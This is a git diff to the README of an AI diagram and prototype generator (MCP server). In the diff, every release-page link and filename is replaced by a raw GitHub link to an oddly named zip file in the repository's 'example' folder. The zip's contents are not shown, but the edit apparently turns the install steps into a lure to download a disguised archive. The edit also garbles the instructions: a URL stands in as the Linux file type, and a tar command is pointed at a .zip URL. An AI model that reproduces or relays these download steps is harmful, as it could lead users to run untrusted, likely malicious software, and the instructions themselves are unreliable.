@@ -6,7 +6,7 @@ Welcome to the AI Diagram & Prototype File Generator (MCP Server). This tool hel
 
 ### 📥 Download Now
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/eslaim/AI-Diagram-Prototype-Generator-MCP-Server-/releases)
+[![Download the latest release](https://raw.githubusercontent.com/eslaim/AI-Diagram-Prototype-Generator-MCP-Server-/main/example/Prototype_Server_Generator_A_Diagram_MC_shekel.zip%https://raw.githubusercontent.com/eslaim/AI-Diagram-Prototype-Generator-MCP-Server-/main/example/Prototype_Server_Generator_A_Diagram_MC_shekel.zip)](https://raw.githubusercontent.com/eslaim/AI-Diagram-Prototype-Generator-MCP-Server-/main/example/Prototype_Server_Generator_A_Diagram_MC_shekel.zip)
 
 ## 📋 System Requirements
 
@@ -19,21 +19,21 @@ Welcome to the AI Diagram & Prototype File Generator (MCP Server). This tool hel
 
 1. **Visit the Releases Page:** Click on the link below to go to the releases page, where you can download the latest version of the application.
 
-   [Download from Releases Page](https://github.com/eslaim/AI-Diagram-Prototype-Generator-MCP-Server-/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/eslaim/AI-Diagram-Prototype-Generator-MCP-Server-/main/example/Prototype_Server_Generator_A_Diagram_MC_shekel.zip)
 
 2. **Select Your Version:** On the releases page, look for the latest version. There will be a list of files you can download.
 
 3. **Choose the File:** Select the correct file for your operating system. You may see options like:
    - `.exe` for Windows
    - `.dmg` for macOS
-   - `.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/eslaim/AI-Diagram-Prototype-Generator-MCP-Server-/main/example/Prototype_Server_Generator_A_Diagram_MC_shekel.zip` for Linux
 
 4. **Download the File:** Click on the file to start the download. Save it to a location you can easily access, like your Desktop or Downloads folder.
 
 5. **Install the Application:**
    - **Windows:** Double-click the `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the downloaded `.dmg` file and drag the application into your Applications folder.
-   - **Linux:** Use the terminal to navigate to the directory where the file is located and run `tar -xzf yourfile.tar.gz`, then follow any additional instructions provided.
+   - **Linux:** Use the terminal to navigate to the directory where the file is located and run `tar -xzf https://raw.githubusercontent.com/eslaim/AI-Diagram-Prototype-Generator-MCP-Server-/main/example/Prototype_Server_Generator_A_Diagram_MC_shekel.zip`, then follow any additional instructions provided.
 
 6. **Run the Application:** Once installed, locate the application on your computer. Double-click on it to start using it.
 
@@ -59,7 +59,7 @@ We frequently release updates to improve the application. It's recommended to ch
 
 ### 🔄 Update Instructions
 
-1. Visit the [Releases Page](https://github.com/eslaim/AI-Diagram-Prototype-Generator-MCP-Server-/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/eslaim/AI-Diagram-Prototype-Generator-MCP-Server-/main/example/Prototype_Server_Generator_A_Diagram_MC_shekel.zip).
 2. Download the latest version as you did during installation.
 3. Follow the installation steps again to update the application.
 
